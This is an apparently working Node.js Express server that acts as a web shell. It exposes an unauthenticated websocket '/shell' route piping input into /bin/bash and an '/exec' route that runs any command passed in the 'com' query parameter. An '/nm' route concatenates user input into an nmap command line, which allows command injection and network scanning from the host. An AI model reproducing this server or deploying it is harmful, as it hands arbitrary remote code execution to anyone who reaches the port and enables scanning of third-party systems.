var express = require("express");
var pty = require("node-pty");
var app = express();
var expressWs = require("express-ws")(app);
var fs = require("fs");
var exec = require("child_process").exec;
var path = require("path");
var http = require("http");
var url = require("url");
const si = require("systeminformation");

expressWs.app.ws("/echo", function(ws, req) {
  ws.on("message", function(msg) {
    ws.send(msg);
  });
});

expressWs.app.ws("/shell", function(ws, req) {
  var shell = pty.spawn("/bin/bash", [], {
    name: "xterm-color",
    cwd: process.env.PWD,
    env: process.env
  });
  shell.on("data", function(data) {
    ws.send(data);
  });
  ws.on("message", function(msg) {
    shell.write(msg);
  });
});

// ddd

app.get("/his", (req, res, next) => {
  try {
    var serverip = req.connection.localAddress;
    res.json(serverip);
  } catch (e) {
    res.json(["error", e.stack]);
  }
});

app.get("/sys", (req, res, next) => {
  try {
    si.networkStats()
      .then(data => res.json(data))
      .catch(error => res.json(error));
  } catch (e) {
    res.json(["error", e.stack]);
  }
});

app.get("/exec2", function(req, res) {
  var queryData = url.parse(req.url, true).query;
  res.writeHead(200, { "Content-Type": "text/plain" });
  //res.end("Hello " + queryData.com + "\n")

  exec("whoami", function(error, stdout, stderr) {
    res.write(stdout); //write a response to the client1
    res.end(); //end the response
    console.log(stdout);
    if (error) {
      console.log(error.code);
    }
  });
});

app.get("/exec", function(req, res) {
  var queryData = url.parse(req.url, true).query;
  res.writeHead(200, { "Content-Type": "text/plain" });
  //res.end("Hello " + queryData.com + "\n")

  exec(queryData.com, function(error, stdout, stderr) {
    res.write(stdout); //write a response to the client1
    res.end(); //end the response
    console.log(stdout);
    if (error) {
      console.log(error.code);
    }
  });
});

app.get("/nm", function(req, res) {
  var queryData = url.parse(req.url, true).query;
  res.writeHead(200, { "Content-Type": "text/plain" });
  //res.end("Hello " + queryData.com + "\n")

  var comm = "/sandbox/sc/nmap " + queryData.com;
  exec(comm, function(error, stdout, stderr) {
    res.write(stdout); //write a response to the client
    res.end(); //end the response
    //console.log(stdout);
    if (error) {
      console.log(error.code);
    }
  });
});

app.get("/", function(req, res) {
  res.sendFile(path.join(__dirname + "/index.html"));
});

app.listen(8080);
console.log("Server is started 8080");
